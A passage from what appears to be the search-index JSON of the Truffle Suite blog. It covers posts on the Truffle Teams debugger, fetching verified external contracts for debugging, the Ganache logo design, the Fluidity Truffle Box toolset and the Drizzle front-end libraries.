contract. You'll notice there's a debug button on each transaction card; clicking it will open the Truffle Teams debugger. Debugging is only a click away! ## Navigating the UI Starting at the top, you'll see the transaction hash along with an icon noting its status and, if applicable, the accompanying error message (1). Below that we have our functions, from left to right: Step Next, Step Over, Step In, Step Out, and Reset (2). Next we have some tabs showing the contracts included in this transaction (3). Finally we have two panes, one showing our Solidity with the current step highlighted in yellow (4). The second with our variables (5). Debugging a failed transaction. At the moment some other enhancements, including breakpoints and syntax highlighting, are coming soon. We wanted to get this powerful feature in your hands as quickly as possible, so we're releasing it now via Early Access. For more information on what to expect from early access, check out [the Truffle Teams Early Access blog post](/blog/try-new-features-first-with-truffle-teams-early-access). For more information, check out [the Truffle Teams Debugger docs](/docs/teams/debugger/debugging-a-transaction) or for general information about Truffle's debugger, check out [the Truffle Debugger docs](/docs/truffle/getting-started/debugging-your-contracts). CHECK OUT THE TRUFFLE TEAMS DEBUGGER ## Continue the Conversation We want Truffle Teams to be the most effective DevOps tool in the blockchain space for both new and existing teams. Let us know what you think about the new deployment views, or if your team has other needs we haven't met yet. Continue the conversation with your fellow Trufflers in our Slack community! SIGN UP FOR THE TRUFFLER SLACK Thanks! _Josh Quintal, Head of Product & Marketing_","title":"Launching the Debugger"},{"location":"blog/debugging-verified-external-contracts-with-truffle-debugger/index.html","text":"Let's say you're crafting a clever flashloan transaction that interacts with five different DeFi dapps -- but on trying it, it doesn't work as expected. You open the transaction in Truffle Debugger to get a closer look at what went wrong. But how will you debug a transaction that the debugger doesn't have the source code for? Well, new in Truffle release v5.1.29 is the debugger's --fetch-external flag! This new flag tells the debugger to search Etherscan's repository of verified contracts and automatically download and compile those sources. As long as all the contracts you're interacting with are verified on Etherscan, you're good to go! This means you'll be able to debug Mainnet / G\u00f6rli / Ropsten / etc. transactions that interact with external contracts without the need to have external contract source code available locally ! Now, before you get too excited, some caveats apply: - This only works with Solidity contracts, since @truffle/debugger only supports Solidity at this time. - While using this feature, you won't be able to load and unload transactions in the debugger like normal; you'll have to quit and restart to change transactions. - In order to be able to use the debugger and have it find the right source to download for your network, you'll need to connect to an archive node that offers the debug_traceTransaction JSON RPC method. (See Geth's Management APIs ). That last one is a pretty big caveat, but there's good news here ! Our sibling SaaS project, Truffle Teams , now lets you simulate live networks via the free Sandbox feature. This works without requiring you to run your own node or to pay for someone else to run their own node, since Truffle Teams offers 1 free sandbox per GitHub organization! Of course, you're free to use the debugger with whatever compatible Ethereum node you like, including command-line Ganache; but here's how to use Truffle Teams, which offers so much more, for this feature. Example: Debug ENS in a [mostly] empty Truffle project! \u00b6 Click to enlarge This screenshot shows truffle debug stepping through a G\u00f6rli transaction to the ENS registry. Once you upgrade to Truffle v5.1.29, you can recreate this by doing the following: Find the G\u00f6rli ENS contract page on Etherscan . Find a recent transaction hash. (See example from screenshot .) Sign up / login to Truffle Teams and make a free Sandbox that forks off G\u00f6rli. Note : At the moment, you'll have to make sure that you manually specify that the Sandbox should use the same network ID as the chain it's forked from (in this case, 5). In the future, however, this step will be handled automatically. You can read more about Sandboxes in our earlier blog post on the subject . Copy your sandbox JSON RPC url to the clipboard. Run truffle init and add this to your new truffle-config.js (replacing \"<paste RPC url>\" with your clipboard contents from step 4): module . exports = { /* ... rest of truffle-config.js ... */ networks : { /* ... rest of networks ... */ sandbox : { url : \"<paste RPC url>\" , network_id : 5 } } } 5a. Optional . If you have an Etherscan API key or feel like making one, you can specify that as well in your truffle-config.js to speed up downloads: module . exports = { /* ... rest of truffle-config.js ... */ etherscan : { // replace this with your API key apiKey : \"0123456789abcdef0123456789abcdef\" } } Copy the transaction hash from step 2 and run the following (replacing <transaction hash> with the 0x -prefixed transaction hash): truffle debug <transaction hash> --network sandbox --fetch-external And that's it! You're now debugging an ENS transaction in an empty Truffle project. You can step through and set breakpoints; inspect both decoded variables and the raw binary state; and get return values, revert messages, and stacktraces just like normal. Now this example is a minimal one just to show how things work. But it will work just as well in your existing projects on transactions that feature your contracts in your project interacting with external verified contracts deployed on live networks. Right now \"verified contracts\" just means contracts verified on Etherscan, but we're also looking at supporting the new Sourcify project, which provides a more decentralized alternative to Etherscan's repository. We plan to add this in an upcoming release. But as of right now, you can use this feature with Etherscan's large library of verified contracts! Update : As of Truffle v5.1.32, Sourcify is now supported! Truffle Debugger will now check both Etherscan and Sourcify for verified contract sources! Hope you find this as exciting as we do! Thanks for using Truffle!","title":"Debugging verified external contracts with Truffle Debugger"},{"location":"blog/debugging-verified-external-contracts-with-truffle-debugger/index.html#example-debug-ens-in-a-mostly-empty-truffle-project","text":"Click to enlarge This screenshot shows truffle debug stepping through a G\u00f6rli transaction to the ENS registry. Once you upgrade to Truffle v5.1.29, you can recreate this by doing the following: Find the G\u00f6rli ENS contract page on Etherscan . Find a recent transaction hash. (See example from screenshot .) Sign up / login to Truffle Teams and make a free Sandbox that forks off G\u00f6rli. Note : At the moment, you'll have to make sure that you manually specify that the Sandbox should use the same network ID as the chain it's forked from (in this case, 5). In the future, however, this step will be handled automatically. You can read more about Sandboxes in our earlier blog post on the subject . Copy your sandbox JSON RPC url to the clipboard. Run truffle init and add this to your new truffle-config.js (replacing \"<paste RPC url>\" with your clipboard contents from step 4): module . exports = { /* ... rest of truffle-config.js ... */ networks : { /* ... rest of networks ... */ sandbox : { url : \"<paste RPC url>\" , network_id : 5 } } } 5a. Optional . If you have an Etherscan API key or feel like making one, you can specify that as well in your truffle-config.js to speed up downloads: module . exports = { /* ... rest of truffle-config.js ... */ etherscan : { // replace this with your API key apiKey : \"0123456789abcdef0123456789abcdef\" } } Copy the transaction hash from step 2 and run the following (replacing <transaction hash> with the 0x -prefixed transaction hash): truffle debug <transaction hash> --network sandbox --fetch-external And that's it! You're now debugging an ENS transaction in an empty Truffle project. You can step through and set breakpoints; inspect both decoded variables and the raw binary state; and get return values, revert messages, and stacktraces just like normal. Now this example is a minimal one just to show how things work. But it will work just as well in your existing projects on transactions that feature your contracts in your project interacting with external verified contracts deployed on live networks. Right now \"verified contracts\" just means contracts verified on Etherscan, but we're also looking at supporting the new Sourcify project, which provides a more decentralized alternative to Etherscan's repository. We plan to add this in an upcoming release. But as of right now, you can use this feature with Etherscan's large library of verified contracts! Update : As of Truffle v5.1.32, Sourcify is now supported! Truffle Debugger will now check both Etherscan and Sourcify for verified contract sources! Hope you find this as exciting as we do! Thanks for using Truffle!","title":"Example: Debug ENS in a [mostly] empty Truffle project!"},{"location":"blog/designing-the-ganache-logo/index.html","text":"Last week we released Ganache , a personal blockchain for Ethereum development. Many of you commented on the design of the landing page and logo, but just how did the gooey cube come to be? Let's take a trip through the 30+ iterations that led to our newest confection. ![Final Ganache Logomark](/img/blog/designing-the-ganache-logo/final-logomark.png) Before setting out on our design journey, we started with some loose guidelines: The new logo should be round and have some dimensionality to keep it consistent with the Truffle logo. The colors should consist of chocolate, an accent color and white. The concepts we explored can be roughly broken down into 4 categories: Core Cutaways, Toppings, Gooey Cores and Soft Blocks. Core Cutaways \u00b6 The first set of core cutaways was an attempt to convey that Ganache, as a local development blockchain, was the \"core\" of your development workflow. They also depict a ganache filled truffle candy of varying viscosities. It was toward the end of this stage we qualified one of our initial guidelines. The logo's dimensionality should be represented purely by shape--no gradients! Fun fact : We considered one of the third row, second and third column concepts as a final candidate, but scrapped it when Tim's wife said it looks like a banana slug floating in space. My baby, a slug?! A great reminder to not get too attached before getting feedback! Toppings \u00b6 Questions about the ability of the core cutaways to translate to flat color, as well as being dimensionally mismatched with the Truffle logo caused us to consider a simpler approach; a spherical candy with ganache on the outside. Overall these failed to look interesting and had the opposite problem in that they weren't dimensional enough. Gooey Cores \u00b6 Not satisfied with the topping options we pressed on and attempted the core concept again, this time with some fancier cutaways. While they stood on their own, they were too wide a departure from the Truffle logo. This lack of cohesion lead to a realization that would be our design breakthrough. Soft Blocks \u00b6 Letting go of our assumption that the shape should be round unlocked a series of designs that eventually led to our final logo. To achieve a more interesting drip pattern, we traced and combined different stages of glaze dripping down a cake. It became apparent that this approach was interesting, but made an overly detailed drip pattern which we later simplified for the final. We also tried a few different treatments of the candy's reflection. Check out that longhorn steer in the lower-left! The Final Logo \u00b6 Success! After reconsidering some assumptions and solidifying others, we arrived at our final design. The final logo has both a compelling design and the following qualities that made it a winner: The colors consist of chocolate, an accent color and white; a guideline we'll keep going forward. It's metaphorically grounded in the product it represents--it's a block, after all! The gooey consistency and soft, rounded corners represent the intimidating technical concept of a blockchain in a friendly and approachable way. ![Final Ganache Logo](/img/blog/designing-the-ganache-logo/final-logomark.png) We had a blast iterating this logo and Ganache itself. We hoped you learned from our experience and maybe picked up some of your own inspiration along the way. Happy illustrating! -- Josh & the Truffle Team","title":"Designing the Ganache Logo"},{"location":"blog/designing-the-ganache-logo/index.html#core-cutaways","text":"The first set of core cutaways was an attempt to convey that Ganache, as a local development blockchain, was the \"core\" of your development workflow. They also depict a ganache filled truffle candy of varying viscosities. It was toward the end of this stage we qualified one of our initial guidelines. The logo's dimensionality should be represented purely by shape--no gradients! Fun fact : We considered one of the third row, second and third column concepts as a final candidate, but scrapped it when Tim's wife said it looks like a banana slug floating in space. My baby, a slug?! A great reminder to not get too attached before getting feedback!","title":"Core Cutaways"},{"location":"blog/designing-the-ganache-logo/index.html#toppings","text":"Questions about the ability of the core cutaways to translate to flat color, as well as being dimensionally mismatched with the Truffle logo caused us to consider a simpler approach; a spherical candy with ganache on the outside. Overall these failed to look interesting and had the opposite problem in that they weren't dimensional enough.","title":"Toppings"},{"location":"blog/designing-the-ganache-logo/index.html#gooey-cores","text":"Not satisfied with the topping options we pressed on and attempted the core concept again, this time with some fancier cutaways. While they stood on their own, they were too wide a departure from the Truffle logo. This lack of cohesion lead to a realization that would be our design breakthrough.","title":"Gooey Cores"},{"location":"blog/designing-the-ganache-logo/index.html#soft-blocks","text":"Letting go of our assumption that the shape should be round unlocked a series of designs that eventually led to our final logo. To achieve a more interesting drip pattern, we traced and combined different stages of glaze dripping down a cake. It became apparent that this approach was interesting, but made an overly detailed drip pattern which we later simplified for the final. We also tried a few different treatments of the candy's reflection. Check out that longhorn steer in the lower-left!","title":"Soft Blocks"},{"location":"blog/designing-the-ganache-logo/index.html#the-final-logo","text":"Success! After reconsidering some assumptions and solidifying others, we arrived at our final design. The final logo has both a compelling design and the following qualities that made it a winner: The colors consist of chocolate, an accent color and white; a guideline we'll keep going forward. It's metaphorically grounded in the product it represents--it's a block, after all! The gooey consistency and soft, rounded corners represent the intimidating technical concept of a blockchain in a friendly and approachable way. ![Final Ganache Logo](/img/blog/designing-the-ganache-logo/final-logomark.png) We had a blast iterating this logo and Ganache itself. We hoped you learned from our experience and maybe picked up some of your own inspiration along the way. Happy illustrating! -- Josh & the Truffle Team","title":"The Final Logo"},{"location":"blog/develop-using-fluidity-truffle-box/index.html","text":"TLDR; Fluidity has a pretty awesome truffle-box with lots of goodies to build secure, well-tested smart contracts. With two simple commands, you\u2019ll be set up for development using these testing and security tools preconfigured. To use: npm install -g truffle truffle unbox fluidity/fluidity-truffle-box Develop using Fluidity Truffle Box \u00b6 Today, I\u2019d like to share Fluidity\u2019s Truffle Box. It contains a combination of tools we use to develop, test, and analyze our smart contracts. As our team has created several products and proof-of-concepts, we\u2019ve developed a set of standards for creating smart contract repos and having a truffle-box makes this easier. We\u2019ve tried and tested different tools and this box contains our favorite tools for efficient development. The Fluidity Truffle Box allows us to bootstrap our smart contract projects. This box focuses primarily on building safe and secure smart contracts that can be easily audited. We\u2019re able to consolidate many of the new tools, as well as ensure that any projects we start always use up to date versions. Prior to starting new projects, we double check that the packages and tools within truffle-box are up to date. We acknowledge this truffle-box is not a kitchen sink of all the tools. It has been curated based upon what we consistently use. The box doesn\u2019t have a UI component and mostly contains configurations and tools that aid in testing. Core Tools \u00b6 At Fluidity we write smart contracts with Solidity using the latest fixed version, currently 0.5.10, and we use Ganache as our primary test chain. We use Open-Zeppelin as the base for many of our contracts\u2019 systems. In addition, there\u2019s a linter for both the smart contracts and tests using solhint and standard . A linter analyzes code and tests and then either recommends or updates the code for potential syntax errors and style recommendations. Solhint\u2019s configuration is present in fluidity-truffle-box and tries to closely align with the Solidity documentation. We use standard because it\u2019s opinionated and keeps the codebase consistent with minimal fuss. Thus, standard doesn\u2019t have any custom configurations. How we handle testing and code coverage \u00b6 Gnosis Mock Contract \u00b6 Gnosis-Mock is a comprehensive mocking smart contract that allows us to perform unit-testing of our smart contracts. For those not familiar, mocking means creating dummy objects to simulate the behavior of real objects. Mocking allows one to isolate the behavior of the testable object from any other dependencies. As an example, certain behavior in smart contract designs, such as closing a token sale, may require dependencies on several state variables and contracts to already be triggered to allow it to burn tokens. To close a token sale, let\u2019s say you need to have started the sale, sold some threshold of tokens, reached a certain future block, and given close sale privileges to another user. Any one of these requirements, outside of just calling close sale, would need to be run if mocking were not used. By simulating these states with dummy smart contract, it narrows down exactly what needs to be tested. We heavily use the Gnosis mock library which allows us to test contracts independently before running any integration tests. Truffle Assertions \u00b6 Truffle assertions has streamlined how we test events and states of smart contracts. The packages works inside Truffle tests and provides more assertions to call about smart contract states. It supports revert reason strings so we can be confident that exact cases are hit on revert. In addition, it provides more granular ways to test for function failures. Eth-gas-reporter \u00b6 Eth gas reporter shows us the gas usage per unit tests in a nice report after running your test suite. We\u2019ve tried many other tools before as well as trying to write custom gas usage with web3. This has been a recent find for us and has made gas analysis much easier. Solidity-coverage \u00b6 We use solidity-coverage to determine what percentage of the codebase is covered by unit tests. We use a forked version by leapdao because this version supports many of the breaking changes with Solidity 0.5.0+. Code coverages give a helpful metric to ensure we\u2019re testing as we code and that all branch paths are tested. It has also served for us to remove redundant code paths that we\u2019ve found were not accessible. In addition, we have incorporated code-coverage with our CI process, meaning it is automatically executed on every pull request we make, allowing us to easily check PRs for code coverage. The configuration is stored in <project_rool>/.solcover.js , and can be personalised for your project. Slither and Mythril \u00b6 Both slither and mythril are python packages that we\u2019ve included in our truffle-box. They are security tools by Trail of Bits that allow us to better self-audit our code and evaluate many of our invariants and assumptions internally. Instructions to run each of these packages are stored in the README.md file of the fluidity-truffle-box. Slither is a static code analyzer by Trail of Bits. It runs across the contracts directory fairly quickly (< 1 min) and picks up potentially vulnerable Solidity code. Mythril is a security analysis tool for EVM bytecode from ConsenSys. The program takes much longer to run, and while it\u2019s in the truffle-box, we\u2019ll usually run this tool on AWS or another cloud environment and analyze those results. While there is some overlap of errors that are picked up by truffle-compile, slither, and mythril, each focuses on different types of error. We therefore find it helpful to use all 3 on our contracts. Circle CI Template \u00b6 At Fluidity we use circle-ci for our continuous integration. By having sample templates in the repo, it\u2019s more convenient to making sure we enable it whenever we create new repositories. The new repos therefore constantly have to build successfully and migrate via Ganache, and test coverage is apparent to all members on the team. With the template in place, it\u2019s quick for us to add additional commands such as linting or gas reporting dependent on where we are in the development process. Unique features \u00b6 Using allowUnlimitedContractSize \u00b6 We allow our initial contract designs not to be limited by any contract size constraints with the use of the flag allowUnlimitedContractSize . Ganache has a default gas limit of 6,721,975 which does not reflect the actual gas limit of public testnet and mainnets, being 7,000,000 and 8,000,000 respectively. While our team does want to reduce the gas footprint while developing and iterating through different token designs/debugging, it\u2019s been helpful not to be limited by a strict gas price or gas limit with testing. For example, we use longer descriptive messages in revert reasons when developing, but reduce them to be more succinct for final code versions. Reducing the string lengths saved us 3,000,000 gas. Run each line in a different terminal window yarn ganache-unlimited yarn truffle truffle-unlimited After settling on a design, we\u2019ll start iterating to reduce gas usage. As mentioned above, we use eth-gas-reporter to do this. Thus, with 100% test coverage and integration tests, eth-gas-reporter gives a pretty comprehensive understanding of gas usage throughout. Custom Migration and Test Utilities \u00b6 There are two custom utilities files that we have created and keep available for the right circumstance of contracts. First, we have a custom migration utilities script. Truffle has deployed contract management but only stores a single address for each contract deploy per network id; each deployed contract is treated as a singleton. However, there have been cases where we\u2019ve deployed multiple instances of the same contract and have needed to save each of the deployed contract addresses. Our solution was to create a custom migration_utils.js that stored the contract addresses per migration in a JSON file. From there, integration tests and accessory scripts use the contract addresses while still relying on the build directory for ABIs. The second script is related to testing time sensitive smart contracts. We\u2019ve written a post about it called Standing the Time of Test and we\u2019ve used this script and features in Ganache to run both idempotent tests as well as run simulations. Running the command for a specific date yarn ganache-unlimited --time '2019-02-15T15:53:00+00:00' Anything else \u00b6 Most of the features are in the README in the directory and I\u2019d love to take any questions or issues using this repository. Linking all these tools allows for a solid, sane development process for our team. They\u2019re always at our fingertips with fluidity-truffle-box. Hopefully, you\u2019ll be able to use the Fluidity Truffle Box to enhance your own smart contract development process! Github repos \u00b6 Fluidity Truffle Box: https://github.com/fluidity/fluidity-truffle-box Gnosis-Mock: https://github.com/gnosis/mock-contract Truffle Assertions: https://github.com/rkalis/truffle-assertions Eth gas reporter: https://github.com/cgewecke/eth-gas-reporter Leapdao Solidity-Coverage: https://github.com/leapdao/solidity-coverage Original Solidity-Coverage: https://github.com/sc-forks/solidity-coverage Slither: https://github.com/crytic/slither Mythril: https://github.com/ConsenSys/mythril Fluidity Resources: \u00b6 Website: https://fluidity.io Twitter: https://twitter.com/fluidityio Facebook: https://facebook.com/fluidityio/ LinkedIn: https://linkedin.com/company/fluidityio/ YouTube: https://youtube.com/c/fluidityio Blog: https://medium.com/fluidity","title":"Develop using Fluidity Truffle Box"},{"location":"blog/develop-using-fluidity-truffle-box/index.html#develop-using-fluidity-truffle-box","text":"Today, I\u2019d like to share Fluidity\u2019s Truffle Box. It contains a combination of tools we use to develop, test, and analyze our smart contracts. As our team has created several products and proof-of-concepts, we\u2019ve developed a set of standards for creating smart contract repos and having a truffle-box makes this easier. We\u2019ve tried and tested different tools and this box contains our favorite tools for efficient development. The Fluidity Truffle Box allows us to bootstrap our smart contract projects. This box focuses primarily on building safe and secure smart contracts that can be easily audited. We\u2019re able to consolidate many of the new tools, as well as ensure that any projects we start always use up to date versions. Prior to starting new projects, we double check that the packages and tools within truffle-box are up to date. We acknowledge this truffle-box is not a kitchen sink of all the tools. It has been curated based upon what we consistently use. The box doesn\u2019t have a UI component and mostly contains configurations and tools that aid in testing.","title":"Develop using Fluidity Truffle Box"},{"location":"blog/develop-using-fluidity-truffle-box/index.html#core-tools","text":"At Fluidity we write smart contracts with Solidity using the latest fixed version, currently 0.5.10, and we use Ganache as our primary test chain. We use Open-Zeppelin as the base for many of our contracts\u2019 systems. In addition, there\u2019s a linter for both the smart contracts and tests using solhint and standard . A linter analyzes code and tests and then either recommends or updates the code for potential syntax errors and style recommendations. Solhint\u2019s configuration is present in fluidity-truffle-box and tries to closely align with the Solidity documentation. We use standard because it\u2019s opinionated and keeps the codebase consistent with minimal fuss. Thus, standard doesn\u2019t have any custom configurations.","title":"Core Tools"},{"location":"blog/develop-using-fluidity-truffle-box/index.html#how-we-handle-testing-and-code-coverage","text":"","title":"How we handle testing and code coverage"},{"location":"blog/develop-using-fluidity-truffle-box/index.html#gnosis-mock-contract","text":"Gnosis-Mock is a comprehensive mocking smart contract that allows us to perform unit-testing of our smart contracts. For those not familiar, mocking means creating dummy objects to simulate the behavior of real objects. Mocking allows one to isolate the behavior of the testable object from any other dependencies. As an example, certain behavior in smart contract designs, such as closing a token sale, may require dependencies on several state variables and contracts to already be triggered to allow it to burn tokens. To close a token sale, let\u2019s say you need to have started the sale, sold some threshold of tokens, reached a certain future block, and given close sale privileges to another user. Any one of these requirements, outside of just calling close sale, would need to be run if mocking were not used. By simulating these states with dummy smart contract, it narrows down exactly what needs to be tested. We heavily use the Gnosis mock library which allows us to test contracts independently before running any integration tests.","title":"Gnosis Mock Contract"},{"location":"blog/develop-using-fluidity-truffle-box/index.html#truffle-assertions","text":"Truffle assertions has streamlined how we test events and states of smart contracts. The packages works inside Truffle tests and provides more assertions to call about smart contract states. It supports revert reason strings so we can be confident that exact cases are hit on revert. In addition, it provides more granular ways to test for function failures.","title":"Truffle Assertions"},{"location":"blog/develop-using-fluidity-truffle-box/index.html#eth-gas-reporter","text":"Eth gas reporter shows us the gas usage per unit tests in a nice report after running your test suite. We\u2019ve tried many other tools before as well as trying to write custom gas usage with web3. This has been a recent find for us and has made gas analysis much easier.","title":"Eth-gas-reporter"},{"location":"blog/develop-using-fluidity-truffle-box/index.html#solidity-coverage","text":"We use solidity-coverage to determine what percentage of the codebase is covered by unit tests. We use a forked version by leapdao because this version supports many of the breaking changes with Solidity 0.5.0+. Code coverages give a helpful metric to ensure we\u2019re testing as we code and that all branch paths are tested. It has also served for us to remove redundant code paths that we\u2019ve found were not accessible. In addition, we have incorporated code-coverage with our CI process, meaning it is automatically executed on every pull request we make, allowing us to easily check PRs for code coverage. The configuration is stored in <project_rool>/.solcover.js , and can be personalised for your project.","title":"Solidity-coverage"},{"location":"blog/develop-using-fluidity-truffle-box/index.html#slither-and-mythril","text":"Both slither and mythril are python packages that we\u2019ve included in our truffle-box. They are security tools by Trail of Bits that allow us to better self-audit our code and evaluate many of our invariants and assumptions internally. Instructions to run each of these packages are stored in the README.md file of the fluidity-truffle-box. Slither is a static code analyzer by Trail of Bits. It runs across the contracts directory fairly quickly (< 1 min) and picks up potentially vulnerable Solidity code. Mythril is a security analysis tool for EVM bytecode from ConsenSys. The program takes much longer to run, and while it\u2019s in the truffle-box, we\u2019ll usually run this tool on AWS or another cloud environment and analyze those results. While there is some overlap of errors that are picked up by truffle-compile, slither, and mythril, each focuses on different types of error. We therefore find it helpful to use all 3 on our contracts.","title":"Slither and Mythril"},{"location":"blog/develop-using-fluidity-truffle-box/index.html#circle-ci-template","text":"At Fluidity we use circle-ci for our continuous integration. By having sample templates in the repo, it\u2019s more convenient to making sure we enable it whenever we create new repositories. The new repos therefore constantly have to build successfully and migrate via Ganache, and test coverage is apparent to all members on the team. With the template in place, it\u2019s quick for us to add additional commands such as linting or gas reporting dependent on where we are in the development process.","title":"Circle CI Template"},{"location":"blog/develop-using-fluidity-truffle-box/index.html#unique-features","text":"","title":"Unique features"},{"location":"blog/develop-using-fluidity-truffle-box/index.html#using-allowunlimitedcontractsize","text":"We allow our initial contract designs not to be limited by any contract size constraints with the use of the flag allowUnlimitedContractSize . Ganache has a default gas limit of 6,721,975 which does not reflect the actual gas limit of public testnet and mainnets, being 7,000,000 and 8,000,000 respectively. While our team does want to reduce the gas footprint while developing and iterating through different token designs/debugging, it\u2019s been helpful not to be limited by a strict gas price or gas limit with testing. For example, we use longer descriptive messages in revert reasons when developing, but reduce them to be more succinct for final code versions. Reducing the string lengths saved us 3,000,000 gas. Run each line in a different terminal window yarn ganache-unlimited yarn truffle truffle-unlimited After settling on a design, we\u2019ll start iterating to reduce gas usage. As mentioned above, we use eth-gas-reporter to do this. Thus, with 100% test coverage and integration tests, eth-gas-reporter gives a pretty comprehensive understanding of gas usage throughout.","title":"Using allowUnlimitedContractSize"},{"location":"blog/develop-using-fluidity-truffle-box/index.html#custom-migration-and-test-utilities","text":"There are two custom utilities files that we have created and keep available for the right circumstance of contracts. First, we have a custom migration utilities script. Truffle has deployed contract management but only stores a single address for each contract deploy per network id; each deployed contract is treated as a singleton. However, there have been cases where we\u2019ve deployed multiple instances of the same contract and have needed to save each of the deployed contract addresses. Our solution was to create a custom migration_utils.js that stored the contract addresses per migration in a JSON file. From there, integration tests and accessory scripts use the contract addresses while still relying on the build directory for ABIs. The second script is related to testing time sensitive smart contracts. We\u2019ve written a post about it called Standing the Time of Test and we\u2019ve used this script and features in Ganache to run both idempotent tests as well as run simulations. Running the command for a specific date yarn ganache-unlimited --time '2019-02-15T15:53:00+00:00'","title":"Custom Migration and Test Utilities"},{"location":"blog/develop-using-fluidity-truffle-box/index.html#anything-else","text":"Most of the features are in the README in the directory and I\u2019d love to take any questions or issues using this repository. Linking all these tools allows for a solid, sane development process for our team. They\u2019re always at our fingertips with fluidity-truffle-box. Hopefully, you\u2019ll be able to use the Fluidity Truffle Box to enhance your own smart contract development process!","title":"Anything else"},{"location":"blog/develop-using-fluidity-truffle-box/index.html#github-repos","text":"Fluidity Truffle Box: https://github.com/fluidity/fluidity-truffle-box Gnosis-Mock: https://github.com/gnosis/mock-contract Truffle Assertions: https://github.com/rkalis/truffle-assertions Eth gas reporter: https://github.com/cgewecke/eth-gas-reporter Leapdao Solidity-Coverage: https://github.com/leapdao/solidity-coverage Original Solidity-Coverage: https://github.com/sc-forks/solidity-coverage Slither: https://github.com/crytic/slither Mythril: https://github.com/ConsenSys/mythril","title":"Github repos"},{"location":"blog/develop-using-fluidity-truffle-box/index.html#fluidity-resources","text":"Website: https://fluidity.io Twitter: https://twitter.com/fluidityio Facebook: https://facebook.com/fluidityio/ LinkedIn: https://linkedin.com/company/fluidityio/ YouTube: https://youtube.com/c/fluidityio Blog: https://medium.com/fluidity","title":"Fluidity Resources:"},{"location":"blog/drizzle-150-a-new-beginning/index.html","text":"_The dawn of a new era for regular releases and a better contributor experience_ Since the beginning, our goal here at Truffle has been to make dapp development as easy as it can be. To this end Josh Quintal created Drizzle , a managed Redux store to make interfacing with the blockchain just a little bit easier. From many to one \u00b6 Today, we are announcing that we are moving to a monorepo. From now on, a single PR can be used to update code and documentation that used to span multiple repos. Over the last two years, we\u2019ve developed libraries on top of Drizzle such as drizzle-react and drizzle-react-components . Since these libraries depend so heavily on each other, it only makes sense for us to move all of these packages to a monorepo to streamline any updates. In addition, we now also have an experimental Vue.js plugin that fits naturally into the monorepo architecture. It is very likely that going forward we will develop new packages to aid the Drizzle ecosystem in this manner. Scoped package names \u00b6 Another big change we are making is towards scoped package names on NPM. This means that instead of: drizzle drizzle-react drizzle-react-components drizzle-vue-plugin We will now have: @drizzle/store @drizzle/react-plugin @drizzle/react-components @drizzle/vue-plugin From an organizational standpoint, this makes it a lot more intuitive to manage your dapp development. Testing \u00b6 Prior to the monorepo, testing our libraries together was a slow, error-prone and painful experience. Our maintainers had to build custom dapps to isolate changes and manually link packages together as well as coordinate with ganache for each front end. The monorepo allows us to have dedicated front end apps that automatically build against the latest libraries and we can conveniently orchestrate them with a single ganache instance in just a couple commands. In other words, you can easily spin up three apps to test various aspects of the monorepo in seconds . _Easily spin up real front ends to test that dapps can work with the current code_ Better release strategy \u00b6 Perhaps the biggest thing that the changes above allow us to do is more frequent releases. In the past year, we often had to deal with delaying the publishing of a new change because it required testing and updating other repos. Our publishing process was essentially being blocked by having to synchronize changes amongst multiple repos. With a monorepo, that all changes, which means that you can look forward to more regular releases and a faster turnaround time for getting issues fixed. Better changelogs are also coming as we move toward adopting conventional commits for each PR that gets merged. Going forward \u00b6 It\u2019s important to note that Drizzle wouldn\u2019t be what it is without the open source community. A big part of why we are making all these changes is because we need you to help us make Web3 a reality together. Here at Truffle, every member on the team is passionate about improving the developer experience of building on Web3. In the upcoming weeks, we will be doing more regular blog posts targeting the front end space so keep an eye out! I would also like to specifically thank Amal Sudama for his work on making this transition. It certainly couldn\u2019t have happened without him.","title":"Drizzle 1.5.0 - A new beginning"},{"location":"blog/drizzle-150-a-new-beginning/index.html#from-many-to-one","text":"Today, we are announcing that we are moving to a monorepo. From now on, a single PR can be used to update code and documentation that used to span multiple repos. Over the last two years, we\u2019ve developed libraries on top of Drizzle such as drizzle-react and drizzle-react-components . Since these libraries depend so heavily on each other, it only makes sense for us to move all of these packages to a monorepo to streamline any updates. In addition, we now also have an experimental Vue.js plugin that fits naturally into the monorepo architecture. It is very likely that going forward we will develop new packages to aid the Drizzle ecosystem in this manner.","title":"From many to one"},{"location":"blog/drizzle-150-a-new-beginning/index.html#scoped-package-names","text":"Another big change we are making is towards scoped package names on NPM. This means that instead of: drizzle drizzle-react drizzle-react-components drizzle-vue-plugin We will now have: @drizzle/store @drizzle/react-plugin @drizzle/react-components @drizzle/vue-plugin From an organizational standpoint, this makes it a lot more intuitive to manage your dapp development.","title":"Scoped package names"},{"location":"blog/drizzle-150-a-new-beginning/index.html#testing","text":"Prior to the monorepo, testing our libraries together was a slow, error-prone and painful experience. Our maintainers had to build custom dapps to isolate changes and manually link packages together as well as coordinate with ganache for each front end. The monorepo allows us to have dedicated front end apps that automatically build against the latest libraries and we can conveniently orchestrate them with a single ganache instance in just a couple commands. In other words, you can easily spin up three apps to test various aspects of the monorepo in seconds . _Easily spin up real front ends to test that dapps can work with the current code_","title":"Testing"},{"location":"blog/drizzle-150-a-new-beginning/index.html#better-release-strategy","text":"Perhaps the biggest thing that the changes above allow us to do is more frequent releases. In the past year, we often had to deal with delaying the publishing of a new change because it required testing and updating other repos. Our publishing process was essentially being blocked by having to synchronize changes amongst multiple repos. With a monorepo, that all changes, which means that you can look forward to more regular releases and a faster turnaround time for getting issues fixed. Better changelogs are also coming as we move toward adopting conventional commits for each PR that gets merged.","title":"Better release strategy"},{"location":"blog/drizzle-150-a-new-beginning/index.html#going-forward","text":"It\u2019s important to note that Drizzle wouldn\u2019t be what it is without the open source community. A big part of why we are making all these changes is because we need you to help us make Web3 a reality together. Here at Truffle, every member on the team is passionate about improving the developer experience of building on Web3. In the upcoming weeks, we will be doing more regular blog posts targeting the front end space so keep an eye out! I would also like to specifically thank Amal Sudama for his work on making this transition. It certainly couldn\u2019t have happened without him.","title":"Going forward"},{"location":"blog/drizzle-reactive-ethereum-data-for-front-ends/index.html","text":"Today we're proud to announce the addition of a new product to the Truffle Suite: Drizzle. Drizzle is a collection of front-end libraries that make writing dapp front-ends easier and more predictable. The core is based on a Redux store. We take care of synchronizing your contract data, transaction data and more. Things stay fast because you declare what to keep in sync. Importantly, this means you have access to the spectacular development tools around Redux. Want to time travel through your recent transactions? You can do that with a slider. Your browser does not support the video tag. Drizzle's architecture is completely modular. This means you never lose access to the underlying web3 functionality you already know--drizzle as much or as little as you like. We've created two packages for use with React, but the core functionality is contained in the base drizzle module itself. If you're familiar with Redux, it's not a stretch to create an Angular library or use it for something other than a webapp. Want to dive in right away? truffle unbox drizzle and you've got a full example dapp. Need more 